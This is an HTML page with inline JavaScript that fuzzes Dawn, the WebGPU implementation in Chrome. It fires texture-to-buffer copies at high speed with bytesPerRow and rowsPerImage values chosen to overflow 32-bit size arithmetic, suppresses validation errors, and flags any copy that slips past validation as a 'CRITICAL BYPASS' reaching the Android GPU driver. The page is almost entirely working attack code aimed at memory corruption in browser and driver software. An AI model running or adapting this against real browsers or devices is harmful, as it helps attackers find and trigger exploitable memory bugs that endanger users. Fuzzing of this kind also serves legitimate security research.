<!DOCTYPE html>
<html>
<head>
    <title>WebGPU V3 Math Breaker</title>
    <style>body { background: #000; color: #0f0; font-family: monospace; }</style>
</head>
<body>
    <h2>Hunting the Dawn C++ Overflow</h2>
    <button id="fuzzBtn" style="padding:15px; background:#f00; color:#fff; font-weight:bold; cursor:pointer;">START V3 FUZZER</button>
    <pre id="log" style="white-space: pre-wrap; word-wrap: break-word;"></pre>

    <script>
        const logEl = document.getElementById('log');
        function log(msg) { logEl.innerText = msg + '\n' + logEl.innerText.substring(0, 3000); }

        // Highly targeted values designed to overflow when multiplied by 3 (depth-1) or bytesPerRow
        const poisonValues = [
            1431655765, // (0xFFFFFFFF / 3)
            1431655766, // (0xFFFFFFFF / 3) + 1 -> OVERFLOWS 32-bit when multiplied by 3!
            4294967295, // 0xFFFFFFFF
            4294967296, // 32-bit boundary
            1073741824, // 0xFFFFFFFF / 4
            // 64-bit overflow targets (JS numbers lose precision here, but we try)
            Number.MAX_SAFE_INTEGER
        ];

        function getPoison() {
            let val = poisonValues[Math.floor(Math.random() * poisonValues.length)];
            // Slightly jitter the number to hit exact exact boundaries
            val += Math.floor(Math.random() * 5) - 2; 
            return Math.abs(val);
        }

        async function runFuzzer() {
            if (!navigator.gpu) { log("WebGPU not supported!"); return; }

            const adapter = await navigator.gpu.requestAdapter();
            const device = await adapter.requestDevice();
            log("[+] Device acquired. Catching async errors...");

            // Listen for Dawn C++ catching the errors
            device.addEventListener('uncapturederror', (event) => {
                // We silently swallow Dawn's validation errors so the fuzzer keeps running
                // console.log("Dawn caught an error: ", event.error.message);
            });

            const buffer = device.createBuffer({
                size: 1024 * 1024 * 16, // 16 MB
                usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC
            });

            const texture = device.createTexture({
                size: { width: 4, height: 4, depthOrArrayLayers: 4 }, // Fixed Depth!
                format: 'rgba8unorm',
                usage: GPUTextureUsage.COPY_SRC | GPUTextureUsage.COPY_DST
            });

            let runs = 0;

            setInterval(() => {
                runs++;
                if(runs % 100 === 0) log(`[+] Executed ${runs} malicious copies...`);

                const encoder = device.createCommandEncoder();

                // 1. Generate aligned bytesPerRow (Must be >= 256)
                let evilBytesPerRow = getPoison();
                evilBytesPerRow = (evilBytesPerRow & ~0xFF) >>> 0; 
                if (evilBytesPerRow === 0) evilBytesPerRow = 256;

                // 2. Generate Rows Per Image (Must be >= 4)
                let evilRowsPerImage = getPoison();
                if (evilRowsPerImage < 4) evilRowsPerImage = 4;

                // 3. Push the device error scope (to see if this specific command bypassed Dawn)
                device.pushErrorScope('validation');

                try {
                    encoder.copyTextureToBuffer(
                        { texture: texture },
                        { 
                            buffer: buffer, 
                            bytesPerRow: evilBytesPerRow, 
                            rowsPerImage: evilRowsPerImage 
                        },
                        { width: 4, height: 4, depthOrArrayLayers: 4 } // Locked Depth!
                    );

                    device.queue.submit([encoder.finish()]);

                    // Check if Dawn caught it asynchronously
                    device.popErrorScope().then((error) => {
                        if (error === null) {
                            // HOLY GRAIL: If error is null, Dawn's C++ math failed to catch the overflow!
                            // It was sent directly to the Android GPU driver!
                            log(`\n[$$$] CRITICAL BYPASS FOUND!`);
                            log(`[$$$] bpr: ${evilBytesPerRow}, rpi: ${evilRowsPerImage}`);
                            log(`[$$$] The driver is executing this now... Brace for impact!\n`);
                        }
                    });

                } catch (e) {
                    // Blink caught it synchronously (e.g., bytesPerRow not multiple of 256)
                }
            }, 2); // Run extremely fast
        }

        document.getElementById('fuzzBtn').addEventListener('click', runFuzzer);
    </script>
</body>
</html>
